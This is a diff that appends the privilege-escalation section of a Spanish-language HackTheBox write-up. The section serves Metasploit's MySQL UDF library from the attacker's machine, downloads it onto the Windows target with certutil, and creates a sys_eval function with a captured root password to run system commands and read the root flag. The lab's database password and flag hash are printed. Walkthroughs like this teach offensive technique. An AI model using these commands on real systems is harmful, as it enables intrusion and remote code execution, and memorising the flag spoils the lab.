@@ -114,3 +114,53 @@ Despues de navegar y encontrar distintos ficheros, nos damos cuenta de instalaci
 - root
 
 - -pHTB@irw4ys_DB!2026
+
+Luego, vamos a escalar privilegios por el mysql que esta en C:.
+Por lo tanto, nos vamos al Kali y ejecutamos:
+
+- cd /usr/share/metasploit-framework/data/exploits/mysql/
+
+Ese comando es un metasploit, biblioteca UDF, permite agregar funciones externas al server, como ejecutar comandos, demostrar riesgos, realizar pruebas y evaluar posibilidades.
+Osea amplia capacidades de mysql y permite interactuar con el sistema operativo.
+Y luego lo serviremos por:
+
+- python3 -m http.server 80
+
+En la maquina objetivo:
+
+- certutil -urlcache -split -f http://miip:80/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
+
+Certuil de windows es para descargar desde una direccion ip y guardardo en una carpeta especifica, con certutil podemos descargar:
+.exe, .dll, .bat, .cmd, .ps1, .txt, .pdf, rar jpg png cer crt y una infinidad.
+
+Para escalar haremos lo siguiente:
+
+- C:\MySQL\bin\mysql.exe -u root -p
+
+y escribimos la contraseña que anteriormente tomamos de root sql:
+
+- CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
+
+Si sale "FUNCTION sys_eval already exists", borrar con "DROP FUNCTION sys_eval;"
+
+- SELECT CONVERT(sys_eval('whoami') USING utf8);
+
+y si responde, estamos dentro.
+
+Nota: podemos usar el cmd para abrir explorer, notepad, y demas para navegar y ver lo necesario, tambien ejecutar .bat ya que en la carpeta de MySQL se nos ejecutan.
+
+![Capture01.png](./captures/capture01.png)
+![Capture02.png](./captures/capture02.png)
+![Capture03.png](./captures/capture03.png)
+![Capture04.png](./captures/capture04.png)
+![Capture05.png](./captures/capture05.png)
+![Capture06.png](./captures/capture06.png)
+
+Luego, ahora una vez cargada la libreria podemos usar consultas SQL para ejecutar en el sistema operativo:
+
+De esta forma, como tenemos permisos admin, vamos a navegar hasta encontrar root.txt
+
+
+- ff4c79fd0e9eb930a33b382301fc2041
+
+HackTheBox Finalizada!!
